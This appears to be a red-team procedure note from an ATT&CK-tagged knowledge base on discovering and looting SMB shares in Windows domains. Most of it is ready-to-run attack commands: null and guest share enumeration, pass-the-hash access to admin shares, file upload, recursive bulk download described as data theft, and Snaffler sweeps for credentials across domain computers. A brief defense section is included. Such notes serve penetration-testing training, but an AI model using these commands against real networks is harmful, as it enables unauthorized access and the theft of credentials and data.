---
id: bf8a59bb-716a-41c3-9e40-e245b4d33704
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:03.266564+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Discovery|TA0007 - Discovery]]'
techniques:
  - '[[techniques/Network Share Discovery|T1135 - Network Share Discovery]]'
sub_techniques: []
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Open Shares]]'
commands:
  - '[[commands/smbmap-null-session-enumeration]]'
  - '[[commands/smbmap-recursive-share-listing]]'
  - '[[commands/smbmap-guest-session-enumeration]]'
  - '[[commands/smbmap-domain-credentials-enumeration]]'
  - '[[commands/pth-smbclient-connect-to-share]]'
  - '[[commands/pth-smbclient-connect-to-admin-share]]'
  - '[[commands/smbclient-list-files]]'
  - '[[commands/smbclient-change-directory]]'
  - '[[commands/smbclient-download-file]]'
  - '[[commands/smbclient-upload-file]]'
  - '[[commands/smbclient-list-smb-shares]]'
  - '[[commands/smbclient-select-share]]'
  - '[[commands/smbclient-recursive-download-setup]]'
  - '[[commands/smbclient-download-files-recursive]]'
  - '[[commands/snaffler-loot-domain-computers]]'
  - '[[commands/snaffler-loot-specific-computers]]'
  - '[[commands/snaffler-loot-specific-directory]]'
platforms:
  - Windows
tools:
  - '[[tools/SMBMap]]'
  - '[[tools/Impacket]]'
  - '[[tools/Samba]]'
  - '[[tools/Snaffler]]'
validated: true
---

# Open-Shares-Enumeration

## Summary

Open Shares Enumeration is a discovery technique used to identify accessible SMB network shares on target Windows systems within a network, such as domain-joined hosts. This procedure leverages tools like SMBMap for initial enumeration, pth-smbclient for pass-the-hash authenticated access, smbclient for anonymous or credentialed interactions, and Snaffler for automated looting of sensitive files. It helps attackers map out file shares containing credentials, configurations, or other valuable data for lateral movement or privilege escalation.

## Description

In Active Directory environments, SMB shares (e.g., C$, ADMIN$, SYSVOL) are often misconfigured, allowing anonymous or low-privilege access to sensitive information. This procedure starts with null or guest session enumeration to discover open shares without credentials, then escalates to authenticated access using hashes or passwords. Once connected, attackers can list, navigate, download, or upload files. Snaffler automates the search for loot like passwords or certificates across multiple hosts. The target environment is typically Windows domains with SMBv1/v2/v3 enabled. Prerequisites include network access to the target (e.g., via initial foothold) and tools installed on the attacker's Kali Linux machine. Success reveals share paths, permissions, and contents for further exploitation.

## Requirements

1. Network connectivity to the target Windows host (e.g., via VPN or compromised machine).
2. Valid domain credentials or NTLM hashes for authenticated access (optional for null/guest sessions).
3. Installed tools: SMBMap, Impacket (for pth-smbclient), Samba (for smbclient), and Snaffler.
4. Python 3 and required dependencies (e.g., ldap3 for Snaffler).

## Defense

- Disable unnecessary administrative shares (e.g., C$, ADMIN$) via Group Policy or registry edits.
- Enforce least privilege access controls on shares using NTFS permissions and share-level ACLs.
- Monitor SMB traffic for anomalous enumeration (e.g., null sessions) using tools like Sysmon or Windows Event Logs (ID 5145 for share access).
- Disable SMBv1 and require SMB signing to prevent relay attacks.

## Objectives

1. Discover open SMB shares on target hosts using null, guest, or authenticated sessions.
2. Connect to shares, navigate directories, and interact with files (list, download, upload).
3. Automate looting of sensitive files across domain computers.
4. Identify misconfigurations for potential credential theft or persistence.

## Instructions

### Step 1: Enumerate Shares Using SMBMap

**Context**: Begin with unauthenticated or low-privilege enumeration to identify accessible shares without alerting defenders. SMBMap is efficient for quick scans. Start with null sessions, then try guest or credentials if needed. This step maps shares and basic permissions.

**Command** ([[commands/smbmap-null-session-enumeration]]):
```bash
smbmap -H $_TARGET_IP
```
> This attempts a null session to list shares and check read/write permissions. Replace $_TARGET_IP with the target's IP (e.g., 10.10.10.10). Expected: List of shares like IPC$, C$, with access levels (READ ONLY or READ/WRITE).

**Command** ([[commands/smbmap-recursive-share-listing]]):
```bash
smbmap -H $_TARGET_IP -R
```
> Performs recursive listing of files in accessible shares. Use if initial scan shows promising shares. Expected: Detailed directory trees with file counts.

**Command** ([[commands/smbmap-guest-session-enumeration]]):
```bash
smbmap -H $_TARGET_IP -u invaliduser
```
> Simulates guest access with a dummy username. Expected: Shares accessible without valid creds.

**Command** ([[commands/smbmap-domain-credentials-enumeration]]):
```bash
smbmap -H $_TARGET_IP -d $_DOMAIN -u $_USERNAME -p $_PASSWORD
```
> Uses provided domain credentials for full access. Expected: Comprehensive share list including hidden ones.

### Step 2: Connect and Interact with Shares Using pth-smbclient

**Context**: For authenticated access via pass-the-hash, use pth-smbclient from Impacket. This is ideal post-credential theft. Connect to specific shares, then use interactive commands to explore.

**Command** ([[commands/pth-smbclient-connect-to-share]]):
```bash
pth-smbclient -U "$_DOMAIN/$_USERNAME%$_NTLM_HASH" //$_TARGET_IP/$_SHARE_NAME
```
> Connects to a named share (e.g., Share) using NTLM hash. Expected: Interactive SMB prompt (smb: \>).

**Command** ([[commands/pth-smbclient-connect-to-admin-share]]):
```bash
pth-smbclient -U "$_DOMAIN/$_USERNAME%$_NTLM_HASH" //$_TARGET_IP/C$
```
> Targets administrative share like C$. Expected: Access to root filesystem if privileges allow.

Once connected:

**Command** ([[commands/smbclient-list-files]]):
```bash
ls
```
> Lists files in current directory. Expected: File/directory listing with sizes and dates.

**Command** ([[commands/smbclient-change-directory]]):
```bash
cd $_DIRECTORY
```
> Navigates into a folder. Expected: Prompt changes to new path.

**Command** ([[commands/smbclient-download-file]]):
```bash
get $_FILE_NAME
```
> Downloads a file to local machine. Expected: File saved locally without errors.

**Command** ([[commands/smbclient-upload-file]]):
```bash
put $_LOCAL_FILE $_REMOTE_PATH
```
> Uploads/replaces a file. Expected: Successful transfer confirmation.

### Step 3: List and Navigate Shares Using smbclient

**Context**: For anonymous or username-based access, use smbclient from Samba. This works well for null sessions to list all shares before connecting.

**Command** ([[commands/smbclient-list-smb-shares]]):
```bash
smbclient -I $_TARGET_IP -L $_TARGET_HOSTNAME -N -U ""
```
> Lists all shares anonymously (-N for no password). Expected: Table of shares like ADMIN$, C$, IPC$, with types and comments.

**Command** ([[commands/smbclient-select-share]]):
```bash
use $_SHARE_NAME
cd $_DIRECTORY
```
> After listing, select and navigate a share. Expected: Connected to share prompt.

**Command** ([[commands/smbclient-list-files]]):
```bash
ls
```
> Lists contents (same as pth-smbclient version). Expected: Directory listing.

### Step 4: Download Files Recursively Using smbclient

**Context**: To exfiltrate entire directories, set up recursive download in smbclient interactive mode. Useful for bulk data theft from open shares.

**Command** ([[commands/smbclient-recursive-download-setup]]):
```bash
mask ""
recurse ON
prompt OFF
lcd $_LOCAL_DIR
```
> Prepares for recursive mget: clears mask, enables recursion, disables prompts, sets local dir. Expected: Commands acknowledged.

**Command** ([[commands/smbclient-download-files-recursive]]):
```bash
mget *
```
> Downloads all files recursively. Expected: Files transferred to local directory.

### Step 5: Loot Sensitive Files Using Snaffler

**Context**: Snaffler automates searching for loot (e.g., passwords, certs) across shares. Run against domain or specific targets after enumeration.

**Command** ([[commands/snaffler-loot-domain-computers]]):
```bash
./Snaffler.exe -d $_DOMAIN -c $_DC_IP -s
```
> Loots all computers in domain via DC. Expected: Log file (snaffler.log) with found sensitive files.

**Command** ([[commands/snaffler-loot-specific-computers]]):
```bash
./Snaffler.exe -n $_COMPUTER1,$_COMPUTER2 -s
```
> Targets specific hosts. Expected: Loot from listed computers.

**Command** ([[commands/snaffler-loot-specific-directory]]):
```bash
./Snaffler.exe -i $_DIRECTORY -s
```
> Searches a single directory/share. Expected: Relevant loot extracted.
